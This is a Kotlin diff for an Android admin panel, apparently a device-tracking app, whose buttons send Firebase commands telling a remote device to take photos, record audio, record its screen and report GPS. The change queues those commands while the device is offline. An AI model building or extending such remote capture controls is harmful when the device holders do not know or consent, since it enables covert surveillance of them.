@@ -429,14 +429,14 @@ fun BigAdminScreen(
                                         modifier = Modifier
                                             .size(10.dp)
                                             .clip(CircleShape)
-                                            .background(if (isOnline) Color(0xFF22C55E) else Color(0xFFEF4444))
+                                            .background(if (isOnline) Color(0xFF22C55E) else Color(0xFFF59E0B))
                                     )
                                     Spacer(modifier = Modifier.width(6.dp))
                                     Text(
-                                        text = if (isOnline) "ONLINE" else "OFFLINE",
+                                        text = if (isOnline) "ONLINE" else "OFFLINE (Kutish)",
                                         fontWeight = FontWeight.Bold,
                                         fontSize = 12.sp,
-                                        color = if (isOnline) Color(0xFF16A34A) else Color(0xFFDC2626)
+                                        color = if (isOnline) Color(0xFF16A34A) else Color(0xFFD97706)
                                     )
                                 }
 
@@ -475,7 +475,8 @@ fun BigAdminScreen(
                                     onClick = {
                                         val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
                                         database.getReference("tracking/devices/$currentDevId/commands/take_photo").setValue(System.currentTimeMillis())
-                                        Toast.makeText(context, "📷 Rasmga olish buyrug'i yuborildi", Toast.LENGTH_SHORT).show()
+                                        val msg = if (isOnline) "📷 Rasmga olish buyrug'i yuborildi" else "📷 Rasm olish buyrug'i navbatga qo'yildi (qurilma ulanganda olinadi)"
+                                        Toast.makeText(context, msg, Toast.LENGTH_SHORT).show()
                                     },
                                     modifier = Modifier.weight(1f),
                                     colors = ButtonDefaults.buttonColors(containerColor = PrimaryBlue),
@@ -491,7 +492,10 @@ fun BigAdminScreen(
                                         isRecordingCommandActive = newState
                                         val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
                                         database.getReference("tracking/devices/$currentDevId/commands/record_audio").setValue(newState)
-                                        Toast.makeText(context, if (newState) "🎙️ Ovoz yozish boshlandi" else "🎙️ Ovoz yozish to'xtatildi", Toast.LENGTH_SHORT).show()
+                                        val msg = if (newState) {
+                                            if (isOnline) "🎙️ Ovoz yozish boshlandi" else "🎙️ Ovoz yozish navbatga qo'yildi"
+                                        } else "🎙️ Ovoz yozish to'xtatildi, saqlanmoqda..."
+                                        Toast.makeText(context, msg, Toast.LENGTH_SHORT).show()
                                     },
                                     modifier = Modifier.weight(1f),
                                     colors = ButtonDefaults.buttonColors(
@@ -514,7 +518,8 @@ fun BigAdminScreen(
                                     onClick = {
                                         val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
                                         database.getReference("tracking/devices/$currentDevId/commands/record_screen").setValue(System.currentTimeMillis())
-                                        Toast.makeText(context, "📹 Ekran zapis yozish buyrug'i yuborildi", Toast.LENGTH_SHORT).show()
+                                        val msg = if (isOnline) "📹 Ekran zapis yozish buyrug'i yuborildi" else "📹 Ekran zapis navbatga qo'yildi"
+                                        Toast.makeText(context, msg, Toast.LENGTH_SHORT).show()
                                     },
                                     modifier = Modifier.weight(1f),
                                     colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF7C3AED)),
@@ -528,7 +533,8 @@ fun BigAdminScreen(
                                     onClick = {
                                         val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
                                         database.getReference("tracking/devices/$currentDevId/commands/request_gps").setValue(System.currentTimeMillis())
-                                        Toast.makeText(context, "🛰️ GPS so'rovi yuborildi", Toast.LENGTH_SHORT).show()
+                                        val msg = if (isOnline) "🛰️ GPS so'rovi yuborildi" else "🛰️ GPS so'rovi navbatga qo'yildi"
+                                        Toast.makeText(context, msg, Toast.LENGTH_SHORT).show()
                                     },
                                     modifier = Modifier.weight(1f),
                                     shape = RoundedCornerShape(10.dp),
